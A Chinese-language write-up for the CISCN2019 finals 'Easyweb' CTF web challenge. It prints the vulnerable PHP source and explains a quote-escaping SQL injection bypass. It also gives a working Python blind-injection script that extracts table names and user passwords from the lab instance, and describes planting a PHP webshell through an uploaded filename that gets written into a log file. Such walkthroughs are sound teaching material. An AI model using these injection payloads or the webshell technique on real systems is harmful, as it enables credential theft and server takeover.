---
title: '[CISCN2019 总决赛 Day2 Web1]Easyweb 1'
abbrlink: 144a0c34
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:15
---# [CISCN2019 总决赛 Day2 Web1]Easyweb

# 1



## 1. 知识点：

### 1.addslashes()：就是在一些敏感符号前面加上`\`转义,转义单引号，双引号，反斜杠，null。

### 2.str_replace(): 将需要的东西替换

例如这里的`str_replace(array("\\0","%00","\\'","'"),"",$id);`

就是把id里面出现的`"\0","%00","\'","'"`全部替换成""	->那就是直接删除了

这里要注意的是：`\\0`实际上指的是`\0`,这里用的也是转义，如果只是`\0`那别人就会以为是空字符null

---



## 2. 思路：



看到登陆页面猜想是sql注入，但是确实是sql但是注入点不在这里。

御剑扫描扫出来了robots.txt发现了禁扫描的备份文件，但是文件名是在源代码可以看到的



![image-20260402095349313](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260402095349663.png)



做什么事情之前看一下源代码

很奇怪吧，为什么一张图片也有image.php?id=2

因为这里是注入点,当然也是我们的备份文件名

既然我们已经找到了注入点，为什么不看看备份文件的内容呢，万一和sql过滤有关呢



![image-20260402085338459](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260402085338580.png)



备份文件源代码

```
<﻿?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);


$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```

看到

```
where id='{$id}' or path='{$path}'
//这里是我们搜索语句

1. 如果我们正常注入语句
where id='1'or 1=1#' or path='{$path}'
由于过滤
where id='1/'or 1=1#' or path='{$path}'
这里的 1/'or 1=1# 变成了id的内容，我们的引号永远留不下，或许我们可以利用搜索语句自带的''，因为这个不会过滤吧
但是我们目标是让 where id=' ' or path=' ' 的 ' or path= 变成id的一部分，而最后剩下的引号被#注释掉，中间我们就可以输入注入语句了
```

就像这样

![image-20260402101216104](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260402101216307.png)

紫色部分被当成id的内容，当我们注释掉最后一个单引号，蓝色部分的就是我们可以执行的注入

但是紫色部分开头的引号不会无缘无故变成内容的一部分，我们需要在这个引号之前加上`\`进行转移

而直接加上\会被转译成`\\`，然后就会被replace删除，无论怎样replace肯定都要对`\\`进行操作，不如让他操作`\\0`

```
如果id=\0
where id='\0' or path='or 1=1#'
where id='\\0' or path='or 1=1
where id='     \' or path=    'or 1=1
这里的'被转移了变成了普通的id内容

构造
id=\0&path=or 1=1#
id=\0&path=or%201=1%23
```

试一试，发现可行

![image-20260402102615413](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260402102615850.png)



---



## 3. exp

#### 1.进行脚本爆破

```
import requests
 
flag=''
#url='http://73a45cbc-48af-4a46-99b7-3d6f5a2ece0d.node5.buuoj.cn:81/search.php?id=6=(ASCII(SUBSTR((select(group_concat(table_name))FROM(information_schema.TABLES)where(table_schema)=%27geek%27),1,1))=70)'

for i in range(1,500,1):
    for y in range(1,128,1):
        #url = 'http://7d5885a3-682e-4e7a-b1b6-f4de47dae856.node5.buuoj.cn:81/image.php?id=\\0&path=or(ASCII(SUBSTR((select(group_concat(table_name))FROM(information_schema.TABLES)where(table_schema)=database()),'+str(i)+',1))='+str(y)+')%23'
        #url='http://7d5885a3-682e-4e7a-b1b6-f4de47dae856.node5.buuoj.cn:81/image.php?id=\\0&path=or(ASCII(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)),'+str(i)+',1))='+str(y)+')%23'
        url='http://7d5885a3-682e-4e7a-b1b6-f4de47dae856.node5.buuoj.cn:81/image.php?id=\\0&path=or(ASCII(SUBSTR((select(group_concat(password))from(users)),'+str(i)+',1))='+str(y)+')%23'
        data=requests.get(url)
        if "JFIF" in str(data.content):
            flag=flag+chr(y)
            print(flag)
            break
```

拿到登陆密码，登陆账号同理爆破出来为admin，拿去登录

![image-20260402103411475](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260402103411632.png)

发现文件上传





![image-20260402100113882](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260402100114028.png)

我们的照片被存在日志文件里面，怎么有提供php后缀，那只要在php文件里面写入我们的木马就ok，那日志php文件里面放着什么呢？

![image-20260402100102433](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260402100102576.png)

打开后，发现显示出了我们的文件名，那只要把文件名改成木马就可以执行了

![](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260402102844954.png)

#### 2.抓包上传

![image-20260402104235628](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260402104236006.png)

然后传入a

![image-20260402104211561](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260402104211778.png)